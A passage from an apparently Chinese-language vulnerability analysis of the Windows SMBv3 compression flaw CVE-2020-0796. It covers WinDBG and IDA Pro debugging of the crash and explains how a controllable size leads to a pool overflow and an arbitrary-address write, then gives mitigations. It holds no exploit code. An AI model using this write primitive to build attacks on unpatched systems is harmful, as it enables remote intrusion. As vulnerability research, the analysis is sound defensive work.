<p>如果目标系统未处于调试状态，我们将观察到目标设备如图1所示进入蓝屏状态。待Windows系统重启后，我们会使用WinDBG打开C:\Windows\System32\MEMORY.DMP文件，通过分析内存转储文件尝试找到触发蓝屏的原因。</p>
<p>如果目标系统处于调试状态，将会在WinDBG中观测到如图2所示的中断：</p>
<p><img src="/2020/04/27/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-2.png" alt="img"></p>
<center>图 2</center>

<h3 id="3-1-释放内存的错误"><a href="#3-1-释放内存的错误" class="headerlink" title="3.1 释放内存的错误"></a>3.1 释放内存的错误</h3><p>无论是任何一种情况，大多时候在WinDBG中首选执行!analyze -v，尝试由WinDBG自动分析导致问题的模块。</p>
<p>或者查看栈回溯</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; kn# Child-SP          RetAddr           Call Site</span><br><span class="line">..</span><br><span class="line">0b fffff904&#96;bd3a2dd0 fffff806&#96;1b97e5ae nt!ExFreePool+0x9</span><br><span class="line">0c fffff904&#96;bd3a2e00 fffff806&#96;1b9d7f41 srvnet!SmbCompressionDecompress+0xfe</span><br><span class="line">0d fffff904&#96;bd3a2e70 fffff806&#96;1b9d699e srv2+0x17f41</span><br><span class="line">0e fffff904&#96;bd3a2ed0 fffff806&#96;1ba19a9f srv2+0x1699e</span><br><span class="line">0f fffff904&#96;bd3a2f00 fffff806&#96;1cdc496e srv2+0x59a9f</span><br><span class="line">..</span><br></pre></td></tr></table></figure>

<p>如上文0x0C号栈帧所示，srvnet模块中的SmbCompressionDecompress函数在调用ExFreePool时是触发蓝屏的直接因素。</p>
<p>同时，我们注意到上文0x0D号栈帧所示的返回函数是模块名+偏移量的形式，这是因为WinDBG没有加载srv2模块的的符号文件。加载srv2模块的符号之后，栈回溯更有可读性：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; lml</span><br><span class="line">start             end                 module name</span><br><span class="line">..</span><br><span class="line">fffff806&#96;1b960000 fffff806&#96;1b9b3000   srvnet     (pdb symbols) c:\symbol\srvnet.pdb\CFE2BF7A30464E7FCE0CC805AA1C96CB1\srvnet.pdb</span><br><span class="line">fffff806&#96;1b9c0000 fffff806&#96;1ba85000   srv2       (pdb symbols)          c:\symbol\srv2.pdb\E423CC65395AE603B3F59D9322DB98F31\srv2.pdb</span><br><span class="line">fffff806&#96;1cc00000 fffff806&#96;1d6b5000   nt         (pdb symbols)          c:\symbol\ntkrnlmp.pdb\CE7FFB00C20B87500211456B3E905C471\ntkrnlmp.pdb</span><br><span class="line">..</span><br><span class="line"></span><br><span class="line">kd&gt; kn</span><br><span class="line"># Child-SP          RetAddr           Call Site</span><br><span class="line">00 fffff904&#96;bd3a1f28 fffff806&#96;1cea92a2 nt!DbgBreakPointWithStatus</span><br><span class="line">01 fffff904&#96;bd3a1f30 fffff806&#96;1cea8992 nt!KiBugCheckDebugBreak+0x12</span><br><span class="line">02 fffff904&#96;bd3a1f90 fffff806&#96;1cdc11a7 nt!KeBugCheck2+0x952</span><br><span class="line">03 fffff904&#96;bd3a2690 fffff806&#96;1cdd2ee9 nt!KeBugCheckEx+0x107</span><br><span class="line">04 fffff904&#96;bd3a26d0 fffff806&#96;1cdd3310 nt!KiBugCheckDispatch+0x69</span><br><span class="line">05 fffff904&#96;bd3a2810 fffff806&#96;1cdd16a5 nt!KiFastFailDispatch+0xd0</span><br><span class="line">06 fffff904&#96;bd3a29f0 fffff806&#96;1cdfa745 nt!KiRaiseSecurityCheckFailure+0x325</span><br><span class="line">07 fffff904&#96;bd3a2b88 fffff806&#96;1cc44380 nt!RtlRbRemoveNode+0x1b6145</span><br><span class="line">08 fffff904&#96;bd3a2ba0 fffff806&#96;1cc43e3a nt!RtlpHpVsChunkCoalesce+0xb0</span><br><span class="line">09 fffff904&#96;bd3a2c10 fffff806&#96;1cc460ad nt!RtlpHpVsContextFree+0x18a</span><br><span class="line">0a fffff904&#96;bd3a2cb0 fffff806&#96;1cf6e0a9 nt!ExFreeHeapPool+0x56d</span><br><span class="line">0b fffff904&#96;bd3a2dd0 fffff806&#96;1b97e5ae nt!ExFreePool+0x9</span><br><span class="line">0c fffff904&#96;bd3a2e00 fffff806&#96;1b9d7f41 srvnet!SmbCompressionDecompress+0xfe</span><br><span class="line">0d fffff904&#96;bd3a2e70 fffff806&#96;1b9d699e srv2!Srv2DecompressData+0xe1</span><br><span class="line">0e fffff904&#96;bd3a2ed0 fffff806&#96;1ba19a9f srv2!Srv2DecompressMessageAsync+0x1e</span><br><span class="line">0f fffff904&#96;bd3a2f00 fffff806&#96;1cdc496e srv2!RfspThreadPoolNodeWorkerProcessWorkItems+0x13f</span><br><span class="line">10 fffff904&#96;bd3a2f80 fffff806&#96;1cdc492c nt!KxSwitchKernelStackCallout+0x2e</span><br><span class="line">11 fffff904&#96;bd3478f0 fffff806&#96;1cc6a33e nt!KiSwitchKernelStackContinue</span><br><span class="line">12 fffff904&#96;bd347910 fffff806&#96;1cc6a13c nt!KiExpandKernelStackAndCalloutOnStackSegment+0x18e</span><br><span class="line">13 fffff904&#96;bd3479b0 fffff806&#96;1cc69fb3 nt!KiExpandKernelStackAndCalloutSwitchStack+0xdc</span><br><span class="line">14 fffff904&#96;bd347a20 fffff806&#96;1cc69f6d nt!KeExpandKernelStackAndCalloutInternal+0x33</span><br><span class="line">15 fffff904&#96;bd347a90 fffff806&#96;1ba197f7 nt!KeExpandKernelStackAndCalloutEx+0x1d</span><br><span class="line">16 fffff904&#96;bd347ad0 fffff806&#96;1d316917 srv2!RfspThreadPoolNodeWorkerRun+0x117</span><br><span class="line">17 fffff904&#96;bd347b30 fffff806&#96;1cd2a715 nt!IopThreadStart+0x37</span><br><span class="line">18 fffff904&#96;bd347b90 fffff806&#96;1cdc86ea nt!PspSystemThreadStartup+0x55</span><br><span class="line">19 fffff904&#96;bd347be0 00000000&#96;00000000 nt!KiStartSystemThread+0x2a</span><br></pre></td></tr></table></figure>

<p>根据函数名称字面理解或参考DDK文档ExFreePool是释放内存的函数，一般不会有什么问题。这个涉及Windows内核的Pool内存管理机制及结构。过往经验告诉我们，ExFreePool需要操作的内存结构被破坏掉了，即这可能是个Windows内核中的内存破坏漏洞(Memory Corruption)。</p>
<p>人生终极三问：你是谁？从哪里来？到哪里去？在漏洞分析领域同样适用。</p>
<p>为搞明白ExFreePool要释放的内存，来自哪里，又是被谁搞坏的。我们需要在IDA Pro中看看srvnet模块中的SmbCompressionDecompress函数。</p>
<p><img src="/2020/04/27/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-3.png" alt="img"></p>
<center>图 3</center>

<p>当然如果你那边IDA Pro显示的和图3所示不同，没有这些可读性较好的变量名，而是像图4这样</p>
<p><img src="/2020/04/27/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-4.png" alt="img"></p>
<center>图 4</center>

<p>也不必惊讶，后续我们会解释，如何通过公开的文档、符号文件或者数据流，注解IDA Pro函数名或者变量名，使得显示更加友好，以便开展分析工作。这个过程有点像Windows系统自带的扫雷游戏。</p>
<p>IDA Pro显示srvnet模块中的SmbCompressionDecompress函数主要流程十分清晰：申请内存(ExAllocatePoolWithTag)、解压处理(RtlDecompressBufferEx2)、释放内存(ExFreePoolWithTag)。</p>
<p>我们现在已知蓝屏的直接原因是释放内存的操作引起的，那么问题就显然出现在成功申请内存之后，到释放内存之间的这个过程中。我们看到这个过程中只有一个处理函数，即RtlDecompressBufferEx2。</p>
<p>现在所有的疑点都集中在了RtlDecompressBufferEx2函数上，</p>
<p><img src="/2020/04/27/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-5.png" alt="img"></p>
<center>图 5</center>

<p>我们来看看这个ntoskrnl模块中的RtlDecompressBufferEx2函数。</p>
<p><img src="/2020/04/27/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-6.png" alt="img"></p>
<center>图 6</center>

<p>在图6中IDA Pro显示RtlDecompressBufferEx2函数是根据参数CompressionFormat的一个跳转函数。</p>
<p><img src="/2020/04/27/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-7.png" alt="img"></p>
<center>图 7</center>

<p>RtlDecompressBufferProcs数组前2个QWORD元素为0。即当CompressionFormat取值为3时，函数最终转向RtlDecompressBufferXpressLz函数中。</p>
<p><img src="/2020/04/27/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-8.png" alt="img"></p>
<center>图 8</center>

<p><img src="/2020/04/27/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-9.png" alt="img"></p>
<center>图 9</center>

<p>在图8和9中，IDA Pro显示RtlDecompressBufferXpressLz函数是一个300多行伪代码的复杂函数。</p>
<p>静态分析有点困难，为了快速定位问题，让我们来试试用WinDBG动态调试一下。</p>
<p>还是执行PoC，windbg中断时执行kn或者!analyze -v。这次我们试试!analyze -v。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">FOLLOWUP_IP:</span><br><span class="line">nt!RtlDecompressBufferXpressLz+2d</span><br><span class="line">0fffff800&#96;4575e3c0 f3a4            rep movs byte ptr [rdi],byte ptr [rsi]</span><br><span class="line"></span><br><span class="line">FAULT_INSTR_CODE:  c085a4f3</span><br><span class="line">SYMBOL_STACK_INDEX:  7</span><br><span class="line">SYMBOL_NAME:  nt!RtlDecompressBufferXpressLz+2d0</span><br><span class="line">FOLLOWUP_NAME:  MachineOwner</span><br><span class="line">MODULE_NAME: nt</span><br><span class="line">IMAGE_NAME:  ntkrnlmp.exe</span><br><span class="line">DEBUG_FLR_IMAGE_TIMESTAMP:  0</span><br><span class="line">STACK_COMMAND:  .thread ; .cxr ; kb</span><br><span class="line">BUCKET_ID_FUNC_OFFSET:  2d0</span><br><span class="line">FAILURE_BUCKET_ID:  AV_INVALID_nt!RtlDecompressBufferXpressLz</span><br><span class="line">BUCKET_ID:  AV_INVALID_nt!RtlDecompressBufferXpressLz</span><br><span class="line">PRIMARY_PROBLEM_CLASS:  AV_INVALID_nt!RtlDecompressBufferXpressLz</span><br></pre></td></tr></table></figure>

<p>太棒了，我们和WinDBG达成了共识。它直接提示可能是nt!RtlDecompressBufferXpressLz+2d0处出了问题。</p>
<p><img src="/2020/04/27/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-10.png" alt="img"></p>
<center>图 10</center>

<p><img src="/2020/04/27/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-11.png" alt="img"></p>
<center>图 11</center>

<p>如图10和11所示，现在我们了解到nt!RtlDecompressBufferXpressLz+2d0处是一个内存复制函数qmemcpy。这符合往常的漏洞构成的元素。</p>
<p>我们需要再了解一下qmemcpy里面的这3个参数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; !pool 0xffffe402f06b3000</span><br><span class="line">Pool page ffffe402f06b3000 region is Nonpaged pool</span><br><span class="line">*ffffe402f06b3000 : large page allocation, tag is LS2%, size is 0xef30 bytes</span><br><span class="line">Pooltag LS2% : LM server allocations</span><br><span class="line"></span><br><span class="line">kd&gt; !pool 0xffffe402f06b3000+0xef30</span><br><span class="line">Pool page ffffe402f06c1f30 region is Nonpaged pool</span><br><span class="line">*ffffe402f06c1f30 size:   b0 previous size:    0  (Free)      *...&amp;</span><br><span class="line">Owning component : Unknown (update pooltag.txt)</span><br><span class="line">ffffe402f06c1fe0 size: 10020 previous size:    0  (Free)       ...&amp;</span><br></pre></td></tr></table></figure>

<p>我们设置一个这样的断点：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bp nt!RtlDecompressBufferXpressLz+0x2D0 &quot;.printf \&quot;RtlDecompressBufferXpressLz(), qmemcpy(dst&#x3D;0x%I64x, src&#x3D;0x%I64x, count&#x3D;0x%I64x)\&quot;, rdi, rsi, r9;.echo&quot;</span><br></pre></td></tr></table></figure>

<p>当WinDBG中断下来时，我们就能得到感兴趣的qmemcpy的3个参数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; r</span><br><span class="line">rax&#x3D;00000000fffffffe rbx&#x3D;ffffe402e90a544f rcx&#x3D;000000008483ffff</span><br><span class="line">rdx&#x3D;ffffe40371234438 rsi&#x3D;ffffe402ec9f4438 rdi&#x3D;ffffe402ec9f4439</span><br><span class="line">rip&#x3D;fffff8015a75e3c0 rsp&#x3D;ffff890c4ed8ad98 rbp&#x3D;ffffe402ec9f4438</span><br><span class="line">r8&#x3D;ffffe402e90a5457  r9&#x3D;000000008483ffff r10&#x3D;ffffe40371234438</span><br><span class="line">r11&#x3D;ffffe402e90a5457 r12&#x3D;0000000000000000 r13&#x3D;ffffe402e373bd00</span><br><span class="line">r14&#x3D;ffffe402e90a5401 r15&#x3D;ffffe403ec9f4437</span><br><span class="line">iopl&#x3D;0         nv up ei ng nz na pe cy</span><br><span class="line">cs&#x3D;0010  ss&#x3D;0018  ds&#x3D;002b  es&#x3D;002b  fs&#x3D;0053  gs&#x3D;002b             efl&#x3D;00040283</span><br><span class="line">nt!RtlDecompressBufferXpressLz+0x2d0:</span><br><span class="line">fffff801&#96;5a75e3c0 f3a4            rep movs byte ptr [rdi],byte ptr [rsi]</span><br></pre></td></tr></table></figure>

<p>伪代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qmemcpy(dst&#x3D;0xffffe402ec9f4439, src&#x3D;0xffffe402ec9f4438, count&#x3D;0x8483ffff)</span><br></pre></td></tr></table></figure>

<p>查看一下目的内存的pool信息：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; !pool 0xffffe402ec9f4439</span><br><span class="line">Pool page ffffe402ec9f4439 region is Nonpaged pool</span><br><span class="line">*ffffe402ec9f4000 : large page allocation, tag is LS00, size is 0x1280 bytes</span><br><span class="line">Pooltag LS00 : SRVNET LookasideList level 0 allocation 256 Bytes, Binary : srvnet.sys</span><br></pre></td></tr></table></figure>

<p>这是一个0x1280大小的large page allocation非分页池内存。qmemcpy函数准备向其中写入<font color="red"><strong>0x8483FFFF</strong> </font>大小的数据。很显然会溢出。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; !pool 0xffffe402ec9f4000+0x1280</span><br><span class="line">Pool page ffffe402ec9f5280 region is Nonpaged pool</span><br><span class="line">*ffffe402ec9f5280 size:  700 previous size:    0  (Free)      *...&amp;</span><br><span class="line">Owning component : Unknown (update pooltag.txt)</span><br><span class="line">ffffe402ec9f5990 size:  290 previous size:    0  (Allocated)  MmCi</span><br><span class="line">ffffe402ec9f5c20 size:  3c0 previous size:    0  (Free)       ...&amp;</span><br></pre></td></tr></table></figure>

<p>对于Pool内存的大小不超过一个页面长度(PAGE_SIZE，即4K字节)时，可以通过使用POOL_HEADER结构体来查看pool块信息。而对于large page allocation的内存却不行。</p>
<p>我们注意到0xffffe402ec9f4000之后在ffffe402ec9f5280 处是一个0x700大小的空闲块，再之后ffffe402ec9f5990 处是一个0x290 大小的已被分配使用的块。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; !poolval 0xffffe402ec9f4000+0x1280</span><br><span class="line">Pool page ffffe402ec9f5280 region is Nonpaged pool</span><br><span class="line">Validating Pool headers for pool page: ffffe402ec9f5280</span><br><span class="line">Pool page [ ffffe402ec9f5000 ] is INVALID.</span><br><span class="line">Analyzing linked list...</span><br><span class="line">[ ffffe402ec9f5000 ]: invalid previous size [ 0x41 ] should be [ 0x0 ]</span><br><span class="line">Scanning for single bit errors...</span><br><span class="line">None found</span><br></pre></td></tr></table></figure>

<p>在qmemcpy函数执行后，我们发现ffffe402ec9f5280处的_POOL_HEADER确实被写入了数据。</p>
<h3 id="3-2-复制数据的大小"><a href="#3-2-复制数据的大小" class="headerlink" title="3.2 复制数据的大小"></a>3.2 复制数据的大小</h3><p>现在我们需要搞明白，复制数据大小和目的地址的来源。</p>
<p><img src="/2020/04/27/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-12.png" alt="img"></p>
<center>图 12</center>

<p>经过类似的断点和调试，我们在nt!RtlDecompressBufferXpressLz+0x2AA处，观察到qmemcpy中的count数据来自于RtlDecompressBufferXpressLz收到的参数CompressedBuffer的最后4个字节与3之和（图12所示）。因此操作压缩数据末尾的4个字节，可以控制复制数据的大小。</p>
<p>复制数据大小的来源已经清楚了，就剩下最后一个谜团–目的地址的来源。</p>
<h3 id="3-3-目的地址的来源"><a href="#3-3-目的地址的来源" class="headerlink" title="3.3 目的地址的来源"></a>3.3 目的地址的来源</h3><p><img src="/2020/04/27/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-13.png" alt="img"></p>
<center>图 13</center>

<p>我们根据设置的WinDBG断点日志，整理了图13所示的函数调用及数据传递过程。也顺便介绍前文所述的如何通过公开的文档、符号文件或者数据流，注解IDA Pro函数名或者变量名，使得显示更加友好，以便开展分析工作。入手点是<a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-rtldecompressbufferex2查阅到的关于RtlDecompressBufferEx2的定义或NT之前泄露的源码中的相关函数定义。" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-rtldecompressbufferex2查阅到的关于RtlDecompressBufferEx2的定义或NT之前泄露的源码中的相关函数定义。</a></p>
<p>从日志上来看，qmemcpy的目的地址正是UncompressedBuffer偏移1的地方。</p>
<p>Srv2DecompressData+0x85处的ExAllocatePoolWithTag() 返回值是0xffffa28f92503000，位于UncompressedBuffer之后0x370CBC8的位置。</p>
<p>即qmemcpy写入数据大小范围内有其他的Pool块时，将会导致ExFreePoolWithTag()时出错。</p>
<h3 id="3-4-任意地址写入"><a href="#3-4-任意地址写入" class="headerlink" title="3.4 任意地址写入"></a>3.4 任意地址写入</h3><p>如果size大小合适或者其范围内没有在用的Pool块，如0x1100+0n24大小时，则会有下述情况：</p>
<p><img src="/2020/04/27/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-14.png" alt="img"></p>
<center>图 14</center>

<p>我们根据相关函数调用，绘制了图14所示的内存布局图。</p>
<p>当srv2!Srv2DecompressData+0x79处 SrvNetAllocateBuffer((unsigned int)(hdr.OriginalCompressedSegmentSize + offset)申请内存时，返回值设定AllocateBuf，简称A点。B点至U点正是SMB协议头中的offset值0x03e8(0n1000)。</p>
<p><img src="/2020/04/27/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-15.png" alt="img"></p>
<center>图 15</center>

<p>OriginalCompressedSegmentSize值（图15中Wireshark所示的OriginalSize）过大，与offset相加导致整数溢出。最终申请了一个较小的内存。即B点至A点的内存。内存的起始地址被写在AllocateBuf+0n24的P点。</p>
<p>当解压函数把超量数据写入U点时，如果超过了之前申请的内存（B点至A点的内存），也会覆盖原本存放在P处的指针。</p>
<p>srv2!Srv2DecompressData+0x108处的memmove会读取P点的指针作为目的地址，写入原始数据中offset之前的数据，从而完成预定的解压逻辑。当P处的指针可以被改写后，攻击者就获得了一次任意地址写入任意数据的能力。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">srv2!memmove(Src&#x3D;0xffffcb0558c5f060, Dst&#x3D;0x4141414141414141, Size&#x3D;1000)</span><br><span class="line"></span><br><span class="line">kd&gt; db 0x0xffffcb0558c5f060</span><br><span class="line">ffffcb05&#96;58c5f060  03 03 03 03 03 03 00 00-00 00 00 00 00 00 ff ff  ................</span><br><span class="line">ffffcb05&#96;58c5f070  ff fe 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">ffffcb05&#96;58c5f080  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">ffffcb05&#96;58c5f090  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">ffffcb05&#96;58c5f0a0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">ffffcb05&#96;58c5f0b0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">ffffcb05&#96;58c5f0c0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">ffffcb05&#96;58c5f0d0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line"></span><br><span class="line">kd&gt; !pool 0x0xffffcb0558c5f060</span><br><span class="line">Pool page ffffcb0558c5f060 region is Nonpaged pool</span><br><span class="line">*ffffcb0558c5f000 : large page allocation, tag is LS00, size is 0x1280 bytes</span><br><span class="line">Pooltag LS00 : SRVNET LookasideList level 0 allocation 256 Bytes, Binary : srvnet.sys</span><br></pre></td></tr></table></figure>

<p>至此漏洞分析视角下的工作基本完成，撰写分析报告时，我们会用倒叙的方法，就是大家经常看到的文章形式。后续文章我们再谈谈漏洞补丁分析和漏洞利用。</p>
<h2 id="4-解决方案"><a href="#4-解决方案" class="headerlink" title="4 解决方案"></a>4 解决方案</h2><p>尽快安装微软官方补丁或在网络出入口上阻止TCP端口445，以防止SMB流量进出互联网。此外，我们建议您进行内部网络分段，并禁止终端之间的SMB连接，以防止横向移动。</p>
<p>禁用SMBv3压缩将防止利用易受攻击的SMB服务器。要禁用SMBv3压缩，可以在PowerShell中运行以下命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Set-ItemProperty -Path  </span><br><span class="line"> &quot;HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters&quot;</span><br><span class="line"> DisableCompression -Type DWORD -Value 1 -Force</span><br></pre></td></tr></table></figure>

<h2 id="5-综述"><a href="#5-综述" class="headerlink" title="5 综述"></a>5 综述</h2><p>此漏洞对攻击者具有很高的价值，可使得攻击者很容易触及分配内存的函数，并且可以控制触发溢出的数据大小。蓝屏(BSOD)一般是远程代码执行的前兆，从其进化到远程代码执行(RCE)会更具挑战性，因为需要借助其他漏洞以便绕过Windows最新的缓解技术(KASLR)。应警惕漏洞利用难度稍小的本地权限提升情景，请尽快安装官方补丁。</p>
<h2 id="6-参考和引用"><a href="#6-参考和引用" class="headerlink" title="6 参考和引用"></a>6 参考和引用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;docs.microsoft.com&#x2F;en-us&#x2F;openspecs&#x2F;windows_protocols&#x2F;ms-smb2&#x2F;1d435f21-9a21-4f4c-828e-624a176cf2a0</span><br><span class="line">https:&#x2F;&#x2F;docs.microsoft.com&#x2F;en-us&#x2F;openspecs&#x2F;windows_protocols&#x2F;ms-smb2&#x2F;5606ad47-5ee0-437a-817e-70c366052962</span><br><span class="line">http:&#x2F;&#x2F;yiiyee.cn&#x2F;blog&#x2F;2013&#x2F;12&#x2F;11&#x2F;large-pool-1&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;docs.microsoft.com&#x2F;en-us&#x2F;windows-hardware&#x2F;drivers&#x2F;ddi&#x2F;ntifs&#x2F;nf-ntifs-rtlgetcompressionworkspacesize</span><br><span class="line">https:&#x2F;&#x2F;docs.microsoft.com&#x2F;en-us&#x2F;windows-hardware&#x2F;drivers&#x2F;ddi&#x2F;ntifs&#x2F;nf-ntifs-rtldecompressbufferex2</span><br></pre></td></tr></table></figure>

<h2 id="7-命令和断点"><a href="#7-命令和断点" class="headerlink" title="7 命令和断点"></a>7 命令和断点</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">sxe ld srv2</span><br><span class="line">!pool</span><br><span class="line">!poolval</span><br><span class="line">dt nt!_POOL_HEADER</span><br><span class="line">.writemem c:\test.log 0x20000000 L1000</span><br><span class="line">bp nt!RtlDecompressBufferEx2 &quot;.printf \&quot;RtlDecompressBufferEx2(CompressionFormat&#x3D;%d, UncompressedBuffer&#x3D;0x%I64x, UncompressedBufferSize&#x3D;%d, CompressedBuffer&#x3D;0x%I64x, CompressedBufferSize&#x3D;0x%I64x, UncompressedChunkSize&#x3D;0x%I64x, FinalUncompressedSize&#x3D;0x%I64x, WorkSpace&#x3D;%d)\&quot;, cl, rdx, r8d, r9, poi(rsp+0x70), poi(rsp+0x78), poi(rsp+0x80), 